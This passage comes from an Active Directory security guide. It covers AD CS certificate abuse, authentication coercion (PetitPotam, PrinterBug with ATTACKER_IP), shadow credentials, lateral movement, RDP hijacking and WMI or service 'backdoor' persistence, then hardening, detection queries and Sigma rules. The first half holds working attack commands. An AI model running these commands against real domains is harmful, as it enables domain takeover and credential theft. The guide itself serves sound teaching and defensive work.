# Modify template to be vulnerable (add SAN flag + client auth)
certipy template -u user@domain.local -p password \
    -template WritableTemplate -save-old \
    -dc-ip 10.0.0.1

# Now exploit as ESC1
certipy req -u user@domain.local -p password -ca DOMAIN-CA \
    -target ca.domain.local -template WritableTemplate \
    -upn administrator@domain.local
```

#### ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 Flag on CA

The CA has the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag enabled — allows ANY template to include a SAN regardless of template settings.

#### ESC7: Vulnerable CA ACL

Attacker has `ManageCA` or `ManageCertificates` rights on the CA. Can approve pending requests or modify CA configuration.

#### ESC8: NTLM Relay to AD CS HTTP Enrollment

The CA enrollment endpoint (certsrv) uses HTTP without EPA (Extended Protection for Authentication). Relay NTLM authentication to enroll certificates.

```bash
# Relay to ADCS web enrollment
impacket-ntlmrelayx -t http://ca.domain.local/certsrv/certfnsh.asp \
    --adcs --template DomainController

# Coerce DC authentication (PetitPotam)
python3 PetitPotam.py ATTACKER_IP DC01.DOMAIN.LOCAL

# Use obtained certificate for DC authentication
certipy auth -pfx dc01.pfx -dc-ip 10.0.0.1
# DCSync with the DC machine account
```

### 4.4 Print Spooler Abuse (PrinterBug / SpoolSample)

The Print Spooler service (`MS-RPRN`) allows any authenticated user to coerce a remote server to authenticate back to an attacker-controlled host. Combined with unconstrained delegation or NTLM relay, this is devastating.

```powershell
# Check if Print Spooler is running on target
ls \\dc01.domain.local\pipe\spoolss

# Trigger authentication from DC to attacker
SpoolSample.exe DC01.DOMAIN.LOCAL ATTACKER.DOMAIN.LOCAL
```

### 4.5 PetitPotam (MS-EFSRPC Abuse)

Similar to PrinterBug but uses the EFS (Encrypting File System) RPC interface. Does not require credentials on unpatched systems (pre-patch).

```bash
# Unauthenticated coercion (unpatched)
python3 PetitPotam.py ATTACKER_IP DC01.DOMAIN.LOCAL

# Authenticated coercion (works even post-patch)
python3 PetitPotam.py -u user -p password -d DOMAIN.LOCAL \
    ATTACKER_IP DC01.DOMAIN.LOCAL
```

### 4.6 Shadow Credentials

If an attacker can write to the `msDS-KeyCredentialLink` attribute of a target user/computer, they can add a key credential and authenticate as that target using PKINIT. No password reset needed — stealthier than ForceChangePassword.

```bash
# Add shadow credential with Certipy
certipy shadow auto -u attacker@domain.local -p password \
    -account TargetUser -dc-ip 10.0.0.1

# With pyWhisker
python3 pywhisker.py -d domain.local -u attacker -p password \
    --target TargetUser --action add --dc-ip 10.0.0.1

# Authenticate with the generated certificate
certipy auth -pfx TargetUser.pfx -dc-ip 10.0.0.1
```

---

## 5. Lateral Movement

### 5.1 Remote Execution Methods

#### PsExec (SMB-based)

Creates a service on the remote host via SCM (Service Control Manager) over SMB, executes command, cleans up.

```bash
# Impacket PsExec
impacket-psexec DOMAIN.LOCAL/admin:password@10.0.0.5
impacket-psexec DOMAIN.LOCAL/admin@10.0.0.5 -hashes :NTHASH

# SysInternals PsExec
psexec.exe \\10.0.0.5 -u DOMAIN\admin -p password cmd.exe
```

**Artifacts:** Event ID 7045 (service installation), named pipe creation, SMB write to ADMIN$.

#### WMI (Windows Management Instrumentation)

```bash
# Impacket wmiexec (semi-interactive shell)
impacket-wmiexec DOMAIN.LOCAL/admin:password@10.0.0.5

# WMI one-liner (PowerShell)
Invoke-WmiMethod -Class Win32_Process -Name Create `
    -ArgumentList "powershell -enc BASE64" `
    -ComputerName 10.0.0.5 -Credential $cred
```

**Artifacts:** Event ID 4688 (process creation via WMI), WMI-Activity operational log.

#### WinRM (Windows Remote Management)

```powershell
# PowerShell Remoting (WinRM)
Enter-PSSession -ComputerName target.domain.local -Credential $cred
Invoke-Command -ComputerName target.domain.local -ScriptBlock { whoami } -Credential $cred

# Evil-WinRM (from Linux)
evil-winrm -i 10.0.0.5 -u admin -p password -s /path/to/scripts
evil-winrm -i 10.0.0.5 -u admin -H NTHASH
```

**Artifacts:** Event ID 4624 (logon type 3), Event ID 91/168 in WinRM operational log.

#### DCOM (Distributed COM)

```powershell
# DCOM via MMC20.Application
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.0.0.5"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami > C:\temp\out.txt","7")

# DCOM via ShellWindows
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID(
    "9BA05972-F6A8-11CF-A442-00A0C90A8F39","10.0.0.5"))
$com.item().Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\Windows\System32",$null,0)
```

### 5.2 RDP Hijacking

If you have SYSTEM-level access on a machine with active RDP sessions, you can hijack another user's session without credentials.

```powershell
# List active sessions
query user

# Hijack session (as SYSTEM — use PsExec -s or service)
tscon <SessionID> /dest:console
# Or from another session:
tscon <TargetSessionID> /dest:<YourSessionName> /password:""
```

### 5.3 Persistence via WMI Event Subscriptions

```powershell
# Create WMI event subscription persistence
$Filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter `
    -Arguments @{
        Name = "BackdoorFilter"
        EventNamespace = "root\cimv2"
        QueryLanguage = "WQL"
        Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60
                 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'
                 AND TargetInstance.SystemUpTime >= 120 AND TargetInstance.SystemUpTime < 180"
    }

$Consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer `
    -Arguments @{
        Name = "BackdoorConsumer"
        CommandLineTemplate = "powershell.exe -enc BASE64_PAYLOAD"
    }

$Binding = Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding `
    -Arguments @{
        Filter = $Filter
        Consumer = $Consumer
    }
```

**Detection:**

```powershell
# Enumerate WMI subscriptions (detection)
Get-WmiObject -Namespace "root\subscription" -Class __EventFilter
Get-WmiObject -Namespace "root\subscription" -Class __EventConsumer
Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding
```

### 5.4 Scheduled Tasks and Service Creation

```powershell
# Remote scheduled task creation
schtasks /create /s TARGET /u DOMAIN\admin /p password `
    /tn "WindowsUpdate" /tr "powershell -enc BASE64" `
    /sc onstart /ru SYSTEM

# Remote service creation (sc.exe)
sc \\TARGET create backdoor binPath= "cmd /c powershell -enc BASE64" start= auto
sc \\TARGET start backdoor
```

---

## 6. Hardening Active Directory

### 6.1 Modello di Amministrazione a Livelli (Tiered Model)

The Microsoft tiered administration model segregates privileged access into three tiers to prevent credential theft from flowing from lower-security systems to higher-security assets.

```
┌─────────────────────────────────────────────────────┐
│ TIER 0 — Identity & Infrastructure Control          │
│ Domain Controllers, AD CS, AD FS, Azure AD Connect  │
│ PKI, SIEM, PAM solution, virtualization hosts       │
│ Credentials: NEVER used on Tier 1 or Tier 2        │
├─────────────────────────────────────────────────────┤
│ TIER 1 — Server & Application Administration        │
│ Member servers, databases, application servers       │
│ Credentials: NEVER used on Tier 2                   │
├─────────────────────────────────────────────────────┤
│ TIER 2 — Workstation & User Administration          │
│ Workstations, laptops, help desk operations         │
│ Credentials: NEVER used on Tier 0 or Tier 1        │
└─────────────────────────────────────────────────────┘
```

**Implementation via GPO:**

```powershell
# Create Tier 0, 1, 2 OUs
New-ADOrganizationalUnit -Name "Tier 0" -Path "DC=domain,DC=local"
New-ADOrganizationalUnit -Name "Tier 1" -Path "DC=domain,DC=local"
New-ADOrganizationalUnit -Name "Tier 2" -Path "DC=domain,DC=local"

# Create tier-specific admin groups
New-ADGroup -Name "Tier0-Admins" -GroupScope Global -GroupCategory Security `
    -Path "OU=Tier 0,DC=domain,DC=local"
New-ADGroup -Name "Tier1-Admins" -GroupScope Global -GroupCategory Security `
    -Path "OU=Tier 1,DC=domain,DC=local"
New-ADGroup -Name "Tier2-Admins" -GroupScope Global -GroupCategory Security `
    -Path "OU=Tier 2,DC=domain,DC=local"

# Deny logon GPO for Tier 0 accounts on Tier 1/2 systems
# (Computer Configuration → Policies → Windows Settings → Security Settings
#  → Local Policies → User Rights Assignment → Deny log on locally/network)
```

### 6.2 PAW — Privileged Access Workstations

PAWs are hardened workstations exclusively used for administering high-security assets. They should:

- Run a hardened OS image with minimal software
- Be physically secured and network-isolated
- Use hardware-based credential protection (smart cards, FIDO2)
- Block internet access (or allow only necessary management URLs)
- Be monitored with enhanced logging
- Never be used for email, web browsing, or general productivity

```powershell
# PAW GPO hardening — deny outbound internet (except management endpoints)
# Configure Windows Firewall via GPO:
# Block all outbound on port 80/443 except:
#   - Domain Controllers (LDAP, Kerberos, DNS)
#   - Management consoles (SCCM, SCOM)
#   - Windows Update (if not WSUS)

# AppLocker policy for PAW (allow only signed management tools)
# Computer Configuration → Policies → Windows Settings → Security Settings
# → Application Control Policies → AppLocker
```

### 6.3 LAPS (Local Administrator Password Solution)

LAPS randomizes local administrator passwords and stores them in AD as a confidential attribute.

```powershell
# Install LAPS (legacy) or Windows LAPS (built-in Server 2019+)
# Legacy LAPS
Install-Module -Name LAPS -Force
Import-Module LAPS

# Extend AD schema for LAPS
Update-AdmPwdADSchema

# Set LAPS permissions — allow specific groups to read passwords
Set-AdmPwdReadPasswordPermission -OrgUnit "OU=Workstations,DC=domain,DC=local" `
    -AllowedPrincipals "Tier2-Admins"

# Deny password read for computer self
Set-AdmPwdComputerSelfPermission -OrgUnit "OU=Workstations,DC=domain,DC=local"

# Configure LAPS via GPO
# Computer Configuration → Policies → Administrative Templates → LAPS
# - Enable local admin password management: Enabled
# - Password Settings: 20 chars, complexity, 30 days max age
# - Name of administrator account to manage: (custom name if renamed)

# Windows LAPS (newer — supports Azure AD backup)
# Built into Windows 11 22H2+ and Server 2019+ with updates
Get-LapsAADPassword -DeviceIds <device-id>  # Azure-backed
Get-LapsDiagnostics  # Troubleshooting
```

### 6.4 Group Managed Service Accounts (gMSA)

gMSAs provide automatic password management for service accounts — passwords are 240 characters, rotated every 30 days, and never known by humans.

```powershell
# Create KDS root key (one-time, forest-wide)
Add-KDSRootKey -EffectiveImmediately
# Production: Add-KDSRootKey -EffectiveTime ((Get-Date).AddHours(-10))

# Create gMSA
New-ADServiceAccount -Name "gMSA-SQL" -DNSHostName "gmsa-sql.domain.local" `
    -PrincipalsAllowedToRetrieveManagedPassword "SQLServers-Group" `
    -KerberosEncryptionType AES128,AES256

# Install gMSA on target server
Install-ADServiceAccount -Identity "gMSA-SQL"
Test-ADServiceAccount -Identity "gMSA-SQL"

# Configure SQL Server service to use gMSA: DOMAIN\gMSA-SQL$
```

### 6.5 Protected Users Group

Members of the `Protected Users` security group receive hardened authentication:
- No NTLM authentication (Kerberos only)
- No DES or RC4 in Kerberos pre-authentication (AES only)
- No credential delegation
- No caching of plaintext credentials or NT hashes after initial logon
- TGT lifetime reduced to 4 hours (non-renewable)

```powershell
# Add sensitive accounts to Protected Users
Add-ADGroupMember -Identity "Protected Users" -Members admin1, admin2, svc_critical

# Verify membership
Get-ADGroupMember -Identity "Protected Users" | Select-Object Name, objectClass

# WARNING: Test thoroughly — some applications break without NTLM
# Do NOT add service accounts that rely on NTLM or delegation
# Do NOT add the default Administrator (RID 500) — it's exempt from some protections
```

### 6.6 Authentication Policies and Silos

Authentication Policies (Windows Server 2012 R2+) enforce:
- Where accounts can authenticate from (network restrictions)
- TGT lifetime limits
- Which DCs issue tickets for the account

Authentication Silos combine policies with a scope — defining which accounts are subject to which policies.

```powershell
# Create Authentication Policy
New-ADAuthenticationPolicy -Name "Tier0-Policy" `
    -UserTGTLifetimeMins 60 `
    -ComputerTGTLifetimeMins 120 `
    -Enforce

# Create Authentication Policy Silo
New-ADAuthenticationPolicySilo -Name "Tier0-Silo" `
    -UserAuthenticationPolicy "Tier0-Policy" `
    -ComputerAuthenticationPolicy "Tier0-Policy" `
    -ServiceAuthenticationPolicy "Tier0-Policy" `
    -Enforce

# Assign accounts to silo
Set-ADAccountAuthenticationPolicySilo -Identity "admin1" `
    -AuthenticationPolicySilo "Tier0-Silo"

# Set access conditions (only authenticate from Tier 0 systems)
$condition = "O:SYG:SYD:(XA;OICI;CR;;;WD;(@USER.ad://ext/AuthenticationSilo == `"Tier0-Silo`"))"
Set-ADAuthenticationPolicy -Identity "Tier0-Policy" `
    -UserAllowedToAuthenticateFrom $condition
```

### 6.7 Credential Guard

Windows Credential Guard uses virtualization-based security (VBS) to isolate LSASS secrets in a protected container. Even with SYSTEM access, an attacker cannot dump credentials from the VBS-protected LSASS.

```powershell
# Enable via GPO:
# Computer Configuration → Administrative Templates → System → Device Guard
# → Turn On Virtualization Based Security: Enabled
# → Credential Guard Configuration: Enabled with UEFI lock

# Or via registry:
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" `
    -Name "EnableVirtualizationBasedSecurity" -Value 1 -Type DWord
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
    -Name "LsaCfgFlags" -Value 1 -Type DWord  # 1=UEFI lock, 2=without lock

# Verify
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
# SecurityServicesRunning should include "1" (Credential Guard)
```

### 6.8 Disabling NTLM

Disabling NTLM eliminates Pass-the-Hash, NTLM relay, and credential theft via network capture. However, legacy applications may break.

```powershell
# Phase 1: Audit NTLM usage
# GPO: Computer Configuration → Windows Settings → Security Settings
#       → Local Policies → Security Options
# Network security: Restrict NTLM: Audit Incoming NTLM Traffic = Enable auditing for all accounts
# Network security: Restrict NTLM: Audit NTLM authentication in this domain = Enable all

# Review audit logs (Event ID 8001-8004 in Operational log)
Get-WinEvent -LogName "Microsoft-Windows-NTLM/Operational" |
    Group-Object -Property Id | Sort-Object Count -Descending

# Phase 2: Add exceptions for legacy apps
# Network security: Restrict NTLM: Add server exceptions in this domain = server1.domain.local

# Phase 3: Deny NTLM
# Network security: Restrict NTLM: NTLM authentication in this domain = Deny all
# Network security: Restrict NTLM: Incoming NTLM traffic = Deny all accounts

# Verify NTLM is blocked
Test-NetConnection target.domain.local -Port 445
# Connection succeeds only if Kerberos works
```

### 6.9 LDAP Signing and Channel Binding

```powershell
# Require LDAP signing (DC-side)
# GPO: Computer Configuration → Windows Settings → Security Settings
#       → Local Policies → Security Options
# Domain controller: LDAP server signing requirements = Require signing

# Registry (Domain Controllers)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" `
    -Name "LDAPServerIntegrity" -Value 2 -Type DWord

# LDAP Channel Binding (CBT)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" `
    -Name "LdapEnforceChannelBinding" -Value 2 -Type DWord
# 0 = Never, 1 = When supported, 2 = Always

# Client-side LDAP signing
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\ldap" `
    -Name "LDAPClientIntegrity" -Value 2 -Type DWord
```

### 6.10 SMB Signing Enforcement

SMB signing prevents NTLM relay attacks targeting SMB services.

```powershell
# Require SMB signing (GPO)
# Computer Configuration → Windows Settings → Security Settings
#       → Local Policies → Security Options
# Microsoft network server: Digitally sign communications (always) = Enabled
# Microsoft network client: Digitally sign communications (always) = Enabled

# Registry enforcement
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" `
    -Name "RequireSecuritySignature" -Value 1 -Type DWord
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" `
    -Name "RequireSecuritySignature" -Value 1 -Type DWord

# Verify SMB signing status across the network
nxc smb 10.0.0.0/24 --gen-relay-list unsigned_hosts.txt
# Empty file = all hosts require signing
```

### 6.11 Ulteriori Misure di Hardening

**Disable machine account quota (prevent RBCD attacks):**
```powershell
Set-ADDomain -Identity "domain.local" -Replace @{"ms-DS-MachineAccountQuota"="0"}
```

**Disable Print Spooler on DCs (prevent PrinterBug):**
```powershell
# GPO for Domain Controllers OU:
# Computer Configuration → Windows Settings → Security Settings → System Services
# Print Spooler: Disabled
Stop-Service -Name Spooler -Force
Set-Service -Name Spooler -StartupType Disabled
```

**Disable LLMNR and NBT-NS (prevent Responder-style poisoning):**
```powershell
# LLMNR — GPO:
# Computer Configuration → Administrative Templates → Network → DNS Client
# Turn off multicast name resolution = Enabled

# NBT-NS — disable via DHCP or registry per interface
$adapters = Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "IPEnabled=true"
foreach ($adapter in $adapters) {
    $adapter.SetTcpipNetbios(2)  # 2 = Disable NetBIOS over TCP/IP
}
```

**krbtgt password rotation:**
```powershell
# Reset krbtgt password (must be done TWICE with 12-24h interval)
# Use the official Microsoft krbtgt reset script from:
# https://github.com/microsoft/New-KrbtgtKeys.ps1
# NEVER reset both passwords simultaneously — causes authentication outage
.\New-KrbtgtKeys.ps1 -Mode 2  # Mode 2 = reset current key
# Wait 12-24 hours (allow replication and ticket expiry)
.\New-KrbtgtKeys.ps1 -Mode 2  # Reset again to invalidate the previous key
```

---

## 7. Monitoraggio e Detection

### 7.1 Critical Event IDs

| Event ID | Source | Description | Attack Relevance |
|----------|--------|-------------|-----------------|
| 4624 | Security | Successful logon | Lateral movement (Type 3=network, Type 10=RDP) |
| 4625 | Security | Failed logon | Password spraying, brute force |
| 4648 | Security | Logon with explicit credentials | runas, PtH tools |
| 4662 | Security | Directory service object access | DCSync detection |
| 4672 | Security | Special privileges assigned | Privileged logon monitoring |
| 4720 | Security | User account created | Persistence |
| 4728/4732/4756 | Security | Member added to security group | Privilege escalation |
| 4768 | Security | TGT requested (AS-REQ) | AS-REP roasting, initial auth |
| 4769 | Security | TGS requested (TGS-REQ) | Kerberoasting (check encryption type) |
| 4771 | Security | Kerberos pre-auth failed | Password spraying |
| 4776 | Security | NTLM credential validation | NTLM usage monitoring |
| 5136 | Security | Directory object modified | ACL changes, attribute modification |
| 5137 | Security | Directory object created | New GPO, computer, user |
| 5141 | Security | Directory object deleted | Cleanup after attack |
| 7045 | System | Service installed | PsExec, service-based execution |
| 4697 | Security | Service installed (audit version) | Same as 7045 but in Security log |

### 7.2 Advanced Detection Queries

**Kerberoasting detection (PowerShell / Windows Event Forwarding):**

```powershell
# Detect RC4 TGS requests from non-machine accounts
Get-WinEvent -FilterXml @"
<QueryList>
  <Query Id="0" Path="Security">
    <Select Path="Security">
      *[System[(EventID=4769)]]
      and
      *[EventData[Data[@Name='TicketEncryptionType']='0x17']]
      and
      *[EventData[Data[@Name='TargetUserName']!='*$']]
      and
      *[EventData[Data[@Name='ServiceName']!='krbtgt']]
    </Select>
  </Query>
</QueryList>
"@ -MaxEvents 100 | ForEach-Object {
    [PSCustomObject]@{
        TimeCreated = $_.TimeCreated
        TargetUser = $_.Properties[0].Value
        ServiceName = $_.Properties[2].Value
        ClientAddress = $_.Properties[6].Value
    }
}
```

**DCSync detection:**

```powershell
# Monitor Event ID 4662 with replication GUIDs
Get-WinEvent -FilterXml @"
<QueryList>
  <Query Id="0" Path="Security">
    <Select Path="Security">
      *[System[(EventID=4662)]]
      and
      *[EventData[
        (Data[@Name='Properties'] and
         (contains(Data[@Name='Properties'],'1131f6aa-9c07-11d1-f79f-00c04fc2dcd2') or
          contains(Data[@Name='Properties'],'1131f6ad-9c07-11d1-f79f-00c04fc2dcd2') or
          contains(Data[@Name='Properties'],'89e95b76-444d-4c62-991a-0facbeda640c')))
      ]]
    </Select>
  </Query>
</QueryList>
"@ -MaxEvents 50
```

**Golden Ticket detection indicators:**
- TGT with abnormally long lifetime (Event ID 4768 → check ticket options)
- TGT requested without prior AS-REQ from that client IP
- User in PAC does not match account name in ticket
- Domain field mismatch

**Password spraying detection:**

```powershell
# Multiple 4771/4625 events with different usernames from same source
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4771} -MaxEvents 10000 |
    Group-Object { $_.Properties[6].Value } |  # Group by client IP
    Where-Object { $_.Count -gt 20 } |
    Sort-Object Count -Descending |
    Select-Object Name, Count
```

### 7.3 Honey Tokens and Honey Accounts

Honey accounts are fake privileged accounts that should never be used legitimately. Any authentication attempt triggers an immediate alert.

```powershell
# Create honey admin account
New-ADUser -Name "svc_backup_admin" -SamAccountName "svc_backup_admin" `
    -UserPrincipalName "svc_backup_admin@domain.local" `
    -AccountPassword (ConvertTo-SecureString "HoneyP@ss2024!ComplexEnough" -AsPlainText -Force) `
    -Enabled $true -CannotChangePassword $true `
    -Description "Backup Service Account - DO NOT DELETE" `
    -Path "OU=Service Accounts,DC=domain,DC=local"

# Add to tempting groups (but with no real access)
Add-ADGroupMember -Identity "Domain Admins" -Members "svc_backup_admin"

# Set SPN to make it kerberoastable (detection trap)
Set-ADUser -Identity "svc_backup_admin" -ServicePrincipalNames @{Add="MSSQLSvc/backup.domain.local:1433"}

# CRITICAL: Set up alerting for ANY authentication by this account
# Event ID 4624/4625/4768/4769 where TargetUserName = svc_backup_admin
# Any such event = active attacker

# Create honey OU with juicy-looking objects
New-ADOrganizationalUnit -Name "Legacy Systems" -Path "DC=domain,DC=local"
# Place objects with sensitive-looking descriptions
```

**Honey token in file shares:**

```powershell
# Create a fake credentials file on common shares
$content = @"
# Legacy Database Credentials - DO NOT MODIFY
# Server: SQLPROD01.domain.local
# User: sa_legacy
# Pass: LegacyDB_2023!Pr0d
"@
$content | Out-File "\\fileserver\IT_Share\Legacy\db_credentials.txt"
# Configure auditing on this file — any access = alert
```

### 7.4 BloodHound Detection

Detect BloodHound/SharpHound collection:

```powershell
# SharpHound indicators:
# - Burst of LDAP queries from non-DC, non-admin workstation
# - Event ID 4662 — bulk directory reads
# - SAMR queries (Event ID via SamrQueryInformationGroup logs)
# - TCP connections to port 445/389 from unexpected sources to many hosts

# Detect LDAP query anomalies (requires baseline)
Get-WinEvent -FilterHashtable @{
    LogName='Directory Service'
    Id=2889  # LDAP unsigned bind
} -MaxEvents 100

# Detect SharpHound session enumeration (NetSessionEnum)
# Requires advanced audit: Object Access → SAM audit
Get-WinEvent -FilterHashtable @{
    LogName='Security'
    Id=4799  # Security-sensitive group membership enumerated
} -MaxEvents 100
```

### 7.5 Sigma Rules for AD Attacks

Sigma rules provide vendor-agnostic detection logic that can be converted to SIEM-specific queries (Splunk SPL, Elastic KQL, Microsoft Sentinel KQL).

```yaml
# Sigma Rule: Kerberoasting Activity
title: Kerberoasting - RC4 Ticket Request
id: 8e54c327-1e72-4d40-8b51-9a0c2f1c5e3f
status: stable
description: Detects Kerberos TGS requests using RC4 encryption from non-machine accounts
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4769
        TicketEncryptionType: '0x17'
    filter_machine:
        ServiceName|endswith: '$'
    filter_krbtgt:
        ServiceName: 'krbtgt'
    condition: selection and not filter_machine and not filter_krbtgt
level: medium
tags:
    - attack.credential_access
    - attack.t1558.003
falsepositives:
    - Legacy applications requiring RC4
    - Service accounts with RC4-only SPNs
```

```yaml
# Sigma Rule: DCSync Attack
title: DCSync Activity - Non-DC Replication
id: a3249a4e-2b63-4c68-9a0d-1b1c90c5e1a7
status: stable
description: Detects directory replication from non-domain controller accounts
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4662
        Properties|contains:
            - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'
            - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'
    filter_dc:
        SubjectUserName|endswith: '$'
        # Additional: correlate SubjectUserName with known DC accounts
    condition: selection and not filter_dc
level: critical
tags:
    - attack.credential_access
    - attack.t1003.006
```

```yaml
# Sigma Rule: AS-REP Roasting
title: AS-REP Roasting Attempt
id: 6f4c2e38-1a52-4f67-b3d9-1c7a5e8f2b4d
status: stable
description: Detects Kerberos authentication failures indicating AS-REP roasting
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4768
        Status: '0x0'
        PreAuthType: '0'
    condition: selection
level: medium
tags:
    - attack.credential_access
    - attack.t1558.004
```

```yaml
# Sigma Rule: Suspicious Service Installation (PsExec-like)
title: Suspicious Remote Service Installation
id: 9b3c1e47-2d5a-4f8b-a1c6-3e7f4d9a2b5c
status: stable
description: Detects service installation with characteristics of PsExec or similar tools
logsource:
    product: windows
    service: system
detection:
    selection:
        EventID: 7045
    filter_names:
        ServiceName|contains:
            - 'PSEXESVC'
            - 'RemComSvc'
            - 'csexec'
    filter_paths:
        ImagePath|contains:
            - '\ADMIN$\'
            - '\C$\Windows\Temp\'
    condition: selection and (filter_names or filter_paths)
level: high
tags:
    - attack.execution
    - attack.t1569.002
```

```yaml
# Sigma Rule: Shadow Credentials Attack
title: Shadow Credentials - msDS-KeyCredentialLink Modification
id: 4a2b1c5e-3d6f-4a8b-9c1d-2e5f7a3b6c4d
status: stable
description: Detects modification of msDS-KeyCredentialLink attribute
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 5136
        AttributeLDAPDisplayName: 'msDS-KeyCredentialLink'
    condition: selection
level: high
tags:
    - attack.credential_access
    - attack.t1556.006
```

### 7.6 Microsoft Defender for Identity (formerly ATA) Alerts

Defender for Identity detects the following AD attacks:

| Alert | MITRE ATT&CK | Description |
|-------|-------------|-------------|
| Suspected Kerberoasting | T1558.003 | RC4 TGS requests anomaly |
| Suspected DCSync | T1003.006 | Replication from non-DC |
| Suspected Golden Ticket | T1558.001 | TGT anomaly detection |
| Suspected skeleton key | T1556.001 | LSASS manipulation on DC |
| Suspected overpass-the-hash | T1550.002 | Kerberos anomaly after NTLM |
| Suspected NTLM relay | T1557.001 | NTLM auth anomaly |
| Suspected DCShadow | T1207 | Rogue DC registration |
| Password spray | T1110.003 | Multiple failed auth |
| Reconnaissance via LDAP | T1018 | Bulk LDAP enumeration |
| Account enumeration | T1087.002 | SAMR/LDAP reconnaissance |

---

## 8. AD Certificate Services Security

### 8.1 Architettura PKI in Active Directory

AD CS provides the PKI (Public Key Infrastructure) for certificate-based authentication, encryption, and code signing within AD environments.

**Components:**
- **Root CA**: Offline, issues certificates only to subordinate CAs. MUST be offline.
- **Subordinate/Issuing CA**: Online, issues certificates to end entities.
- **Certificate Templates**: Define what type of certificates can be issued, who can request them, and what attributes they contain.
- **CRL Distribution Points (CDP)**: Publish certificate revocation lists.
- **OCSP Responder**: Online Certificate Status Protocol for real-time revocation checks.
- **Enrollment endpoints**: RPC (certsrv), HTTP (CES/CEP), DCOM, NDES.

```powershell
# Enumerate CA infrastructure
certutil -config - -ping  # Find all CAs in the domain
certutil -catemplates     # List all published templates on the CA
certutil -TCAInfo         # List enterprise CAs registered in AD

# Get CA configuration
certutil -getreg CA\CSP   # Cryptographic configuration
certutil -getreg policy   # Policy module config
```

### 8.2 Certificate Template Misconfiguration

**Audit all templates for dangerous combinations:**

```bash
# Certipy enumeration (comprehensive)
certipy find -u user@domain.local -p password -dc-ip 10.0.0.1 -stdout

# Output categories:
# [!] Vulnerabilities → lists ESC1-ESC8 findings
# Certificate Templates → all templates with their settings
# Certificate Authorities → CA configuration
```

```powershell
# PowerShell enumeration of dangerous templates
Import-Module ActiveDirectory
$templates = Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,$((Get-ADRootDSE).configurationNamingContext)" `
    -Filter * -Properties *

foreach ($t in $templates) {
    $flags = $t.'msPKI-Certificate-Name-Flag'
    $enrollmentFlag = $t.'msPKI-Enrollment-Flag'
    $ekus = $t.'pKIExtendedKeyUsage'

    # ESC1 check: enrollee supplies subject + client auth EKU
    if (($flags -band 1) -and  # CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
        ($ekus -contains "1.3.6.1.5.5.7.3.2" -or  # Client Authentication
         $ekus -contains "1.3.6.1.4.1.311.20.2.2" -or  # Smart Card Logon
         $ekus -contains "2.5.29.37.0" -or  # Any Purpose
         $ekus.Count -eq 0)) {  # No EKU = all purposes
        Write-Warning "VULNERABLE (ESC1): $($t.Name)"
    }
}
```

### 8.3 Hardening Certificate Templates

```powershell
# Fix ESC1: Remove CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
# For each vulnerable template:
$templateDN = "CN=VulnTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,$((Get-ADRootDSE).configurationNamingContext)"
$template = Get-ADObject $templateDN -Properties msPKI-Certificate-Name-Flag
$currentFlags = $template.'msPKI-Certificate-Name-Flag'
$newFlags = $currentFlags -band (-bnot 1)  # Remove bit 0
Set-ADObject $templateDN -Replace @{'msPKI-Certificate-Name-Flag' = $newFlags}

# Require CA manager approval for sensitive templates
# msPKI-Enrollment-Flag: add CT_FLAG_PEND_ALL_REQUESTS (bit 1 = 0x2)
$currentEnrollFlags = $template.'msPKI-Enrollment-Flag'
$newEnrollFlags = $currentEnrollFlags -bor 2
Set-ADObject $templateDN -Replace @{'msPKI-Enrollment-Flag' = $newEnrollFlags}

# Restrict enrollment permissions — remove "Authenticated Users" and "Domain Computers"
# Add only specific groups that should be able to enroll
```

**Fix ESC6 (disable EDITF_ATTRIBUTESUBJECTALTNAME2 on CA):**

```powershell
# Check current CA configuration
certutil -getreg policy\EditFlags
# If EDITF_ATTRIBUTESUBJECTALTNAME2 (0x00040000) is present:
certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
# Restart CA service
Restart-Service certsvc
```

**Fix ESC8 (NTLM relay to enrollment endpoint):**

```powershell
# Enable EPA (Extended Protection for Authentication) on CES/CEP
# IIS → Sites → Default Web Site → CertSrv → Authentication
# → Windows Authentication → Advanced Settings → Extended Protection: Required

# Or disable HTTP enrollment entirely and use RPC enrollment only
# Remove the CES and CEP roles if not needed

# Enable HTTPS-only for enrollment web services
# Require certificate-based authentication for enrollment (mutual TLS)
```

### 8.4 Certificate Issuance Auditing

```powershell
# Enable CA auditing
certutil -setreg CA\AuditFilter 127  # Audit all operations (bitmask)
# Restart CA service
Restart-Service certsvc

# Audit filter bits:
# 1 = Start/Stop CA Service
